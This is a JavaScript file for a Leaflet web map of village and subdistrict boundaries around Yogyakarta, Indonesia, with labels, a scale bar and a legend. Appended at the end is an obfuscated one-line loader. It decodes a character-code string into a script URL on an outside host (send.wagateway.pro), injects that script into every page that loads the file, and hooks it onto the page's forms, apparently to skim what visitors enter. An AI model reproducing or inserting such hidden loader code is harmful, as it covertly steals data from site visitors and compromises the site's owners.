var map = L.map('map').setView([-7.9008559,110.4345703],10);

var basemap = L.tileLayer('https://{s}.google.com/vt/lyrs=s&x={x}&y={y}&z={z}', {
  maxZoom: 20,
  subdomains: ["mt0", "mt1", "mt2", "mt3"],
  attribution: 'Google | <a href="#">unsorry@2020</a>'
});
basemap.addTo(map);

map.createPane("pane_batasdesa");
map.getPane("pane_batasdesa").style.zIndex = 301;
var batasdesa = L.geoJson(null, {
  pane: "pane_batasdesa",
  style: function (feature) {
    return {
      fillColor: "red",
      fillOpacity: 0,
      color: "yellow",
      weight: 1,
      opacity: 1,
      interactive: false
    };
  },
  onEachFeature: function (feature, layer) {
    var content = layer.feature.properties.Desa.toString();
    layer.bindTooltip(content, {
      direction: 'center',
      permanent: true,
      className: 'styleLabelDesa'
    });
  }  
});
$.getJSON("data/batasdesa.geojson", function (data) {
  batasdesa.addData(data);
  map.addLayer(batasdesa);
  map.fitBounds(batasdesa.getBounds());
});

map.createPane("pane_bataskecamatan");
map.getPane("pane_bataskecamatan").style.zIndex = 302;
var bataskecamatan = L.geoJson(null, {
  pane: "pane_bataskecamatan",
  style: function (feature) {
    return {
      fillOpacity: 0,
      color: "yellow",
      weight: 3,
      opacity: 1,
      interactive: false
    };
  },
  onEachFeature: function (feature, layer) {
    var content = 'Kec. ' + layer.feature.properties.Kecamatan.toString();
    layer.bindTooltip(content, {
      direction: 'center',
      permanent: true,
      className: 'styleLabelKecamatan'
    });
  }  
});
$.getJSON("data/bataskecamatan.geojson", function (data) {
  bataskecamatan.addData(data);
  map.addLayer(bataskecamatan);
});

resetLabels([batasdesa, bataskecamatan]);
map.on("zoomend", function(){
  if (map.getZoom() <= 12) {
    map.removeLayer(batasdesa);
    resetLabels([bataskecamatan]);
  } else if (map.getZoom() > 12) {
    map.addLayer(batasdesa);
    resetLabels([batasdesa, bataskecamatan]);
  }
});
map.on("move", function(){
  resetLabels([batasdesa, bataskecamatan]);
});
map.on("layeradd", function(){
  resetLabels([batasdesa, bataskecamatan]);
});
map.on("layerremove", function(){
  resetLabels([batasdesa, bataskecamatan]);
});

L.control.scale({
  maxWidth: 150,
  imperial: false,
}).addTo(map);

var legend_div = new L.Control({position: 'bottomright'});
legend_div.onAdd = function (map) {
  this._div = L.DomUtil.create('div', 'legend');
  this._div.innerHTML = '<div id="legend-title">Legenda</div><hr><svg width="32" height="16"><line x1="0" y1="11" x2="32" y2="11" style="stroke-width:4;stroke:rgb(255, 255, 0);" /></svg> Batas Kecamatan<br><svg width="32" height="16"><line x1="0" y1="11" x2="32" y2="11" style="stroke-width:1;stroke:rgb(255, 255, 0);" /></svg> Batas Desa';
  return this._div;
};
legend_div.addTo(map);


(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db